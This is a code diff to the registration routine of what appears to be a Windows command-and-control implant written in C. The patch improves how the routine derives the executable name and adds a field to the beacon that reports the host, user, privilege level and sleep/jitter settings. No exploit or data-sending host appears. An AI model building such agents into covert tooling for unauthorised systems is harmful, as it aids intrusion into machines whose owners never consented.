@@ -219,9 +219,27 @@ static int is_elevated(void) {
 
 int agent_register(void) {
     char exe_name[MAX_PATH] = "agent.exe";
-    GetModuleFileNameA(NULL, exe_name, sizeof(exe_name));
-    char *slash = strrchr(exe_name, '\\');
-    if (slash) memmove(exe_name, slash + 1, strlen(slash));
+    if (GetModuleFileNameA(NULL, exe_name, sizeof(exe_name)) > 0) {
+        char *slash = strrchr(exe_name, '\\');
+        if (slash) memmove(exe_name, slash + 1, strlen(slash + 1) + 1);
+    } else {
+        /* Fallback: parse executable name from command-line (first token) */
+        const char *cl = GetCommandLineA();
+        if (cl) {
+            char tmp[MAX_PATH] = {0};
+            if (*cl == '"') {
+                cl++;
+                size_t i = 0;
+                while (*cl && *cl != '"' && i < sizeof(tmp)-1) tmp[i++] = *cl++;
+            } else {
+                size_t i = 0;
+                while (*cl && *cl != ' ' && i < sizeof(tmp)-1) tmp[i++] = *cl++;
+            }
+            char *slash = strrchr(tmp, '\\');
+            const char *base = slash ? slash + 1 : tmp;
+            if (*base) strncpy(exe_name, base, sizeof(exe_name) - 1);
+        }
+    }
 
     char hostname[128] = "UNKNOWN", username[128] = "UNKNOWN";
     GetComputerNameA(hostname, &(DWORD){sizeof(hostname)});
@@ -231,7 +249,7 @@ int agent_register(void) {
     snprintf(body, sizeof(body),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
         "\"pid\":%lu,\"transport\":\"%s\","
-        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s}",
+        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"language\":\"c\"}",
         hostname, username, (unsigned long)GetCurrentProcessId(),
         AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
         is_elevated() ? "true" : "false");
